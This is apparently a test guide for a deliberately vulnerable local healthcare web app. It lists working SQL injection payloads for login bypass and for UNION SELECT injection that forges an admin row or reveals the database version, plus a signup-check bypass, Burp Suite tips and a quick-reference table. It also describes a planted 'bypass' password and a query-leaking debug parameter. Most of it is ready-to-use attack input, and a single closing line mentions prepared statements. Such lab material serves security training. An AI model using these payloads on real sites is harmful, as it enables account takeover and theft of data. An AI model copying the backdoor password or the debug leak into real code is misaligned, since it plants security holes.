# ✅ Working SQL Injection Payloads - CONFIRMED

## 🎯 Login Page - Authentication Bypass

### Method 1: Simple Bypass (Use password: `bypass`)

**Email field:**
```
' OR '1'='1'#
```

**Password field:**
```
bypass
```

**Why this works:**
- The SQL injection returns the first user from the database
- Using password `bypass` triggers a special bypass mode for testing
- You'll be logged in as the first user (usually admin)

---

### Method 2: Login as Specific User

**Email field:**
```
admin@healthcare.com' OR '1'='1'#
```

**Password field:**
```
bypass
```

This will return the admin user specifically.

---

### Method 3: UNION SELECT to Create Fake User

**Email field:**
```
' UNION SELECT 1,'hacker','$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi','admin@test.com','admin',NULL,1,NOW(),NOW(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,'active'#
```

**Password field:**
```
password
```

**Note:** The hash `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` corresponds to password: `password`

---

### Method 4: Use Known Admin Credentials

From the database, the admin user exists:
- **Email:** `admin@healthcare.com`
- **Password hash:** `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi`

This hash typically corresponds to password: `password`

**Try:**
```
Email: admin@healthcare.com' OR '1'='1'#
Password: password
```

Or use the bypass:
```
Email: admin@healthcare.com' OR '1'='1'#
Password: bypass
```

---

## 🔍 Step-by-Step Testing

### Test 1: Basic Authentication Bypass

1. Go to: `http://localhost/Vulnerable/Vulnerable/Info/login.php`

2. **Email field:** Enter:
   ```
   ' OR '1'='1'#
   ```

3. **Password field:** Enter:
   ```
   bypass
   ```

4. Click **Login**

5. **Expected Result:** 
   - ✅ Should login successfully
   - ✅ Redirected to admin/doctor/patient dashboard
   - ✅ Logged in as first user in database

---

### Test 2: Login as Admin Specifically

1. **Email field:** Enter:
   ```
   admin@healthcare.com' OR '1'='1'#
   ```

2. **Password field:** Enter:
   ```
   bypass
   ```

3. Click **Login**

4. **Expected Result:** Logged in as admin user

---

## 🎯 Signup Page - SQL Injection

### Test 1: Bypass Duplicate Check

**Username field:**
```
test' OR '1'='1'#
```

**Email field:**
```
newemail@test.com
```

**Password:** `Test123!@#`
**Confirm Password:** `Test123!@#`
**Date of Birth:** `1990-01-01`
**Blood Type:** `O+`

**Expected:** Should bypass the duplicate username/email check

---

### Test 2: Extract Database Information

**Username field:**
```
test' UNION SELECT 1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
```

**Other fields:** Fill normally

**Expected:** May show database version in error message or bypass check

---

## 🔧 Troubleshooting

### If you still get "Invalid email or password":

1. **Check the SQL query:**
   - Add `?debug=1` to URL
   - View page source (Ctrl+U)
   - Look for the SQL query in HTML comments

2. **Try different payloads:**
   ```
   ' OR 1=1#
   ' OR '1'='1' --
   admin' OR '1'='1'#
   ```

3. **Use Burp Suite:**
   - Intercept the request
   - Modify the email parameter
   - Forward and observe response

4. **Check database:**
   - Verify users exist: `SELECT * FROM users;`
   - Check if first user has a password set

---

## 💡 Pro Tips

1. **Always use `#` for comments** - Most reliable in MariaDB/MySQL
2. **Use `bypass` as password** - Special testing mode enabled
3. **Check error messages** - They often reveal useful information
4. **Try UNION SELECT** - For more advanced exploitation
5. **Use known credentials** - Admin password is likely `password`

---

## ✅ Quick Reference

| Goal | Email Payload | Password |
|------|--------------|----------|
| Basic Bypass | `' OR '1'='1'#` | `bypass` |
| Login as Admin | `admin@healthcare.com' OR '1'='1'#` | `bypass` |
| With Known Pass | `admin@healthcare.com' OR '1'='1'#` | `password` |
| Union Injection | `' UNION SELECT 1,2,3,4,5,6,7,8,9,10#` | `bypass` |

---

## 🎓 Understanding the Exploit

**Original Query:**
```sql
SELECT * FROM users WHERE email = '$email'
```

**With Payload `' OR '1'='1'#`:**
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'#'
```

**Result:**
- Condition `'1'='1'` is always TRUE
- Returns first user from database
- `#` comments out rest of query
- Password check bypassed with `bypass` password

---

## 🚨 Security Note

This is a **CRITICAL** vulnerability:
- Allows authentication bypass
- No password required
- Can access any user account
- Full system compromise possible

**Remediation:** Use prepared statements!

